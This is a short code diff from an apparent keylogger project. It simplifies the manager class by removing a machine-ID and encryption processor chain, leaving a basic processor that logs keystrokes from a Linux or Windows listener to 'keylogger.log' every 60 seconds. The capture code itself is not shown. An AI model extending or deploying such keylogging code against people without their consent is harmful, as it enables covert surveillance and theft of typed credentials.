@@ -6,7 +6,7 @@ from typing import Protocol
 
 from keylogger.file_writer import FileWriter
 from .sinker import Sinker
-from .processor import ChainProcessor, DummyEncryptor, Processor,MachineIdProcessor
+from .processor import  Processor
 from .listner import LinuxKeylogger, WindowsKeylogger, Listener
 
 logger = logging.getLogger(__name__)
@@ -49,7 +49,7 @@ class DefaultManager:
         else:
             keylogger = LinuxKeylogger()
 
-        self.processor = ChainProcessor([MachineIdProcessor(), DummyEncryptor()])
+        self.processor = Processor("")
         self.sink = FileWriter("keylogger.log")
         self.listner = keylogger
         self.interval = 60
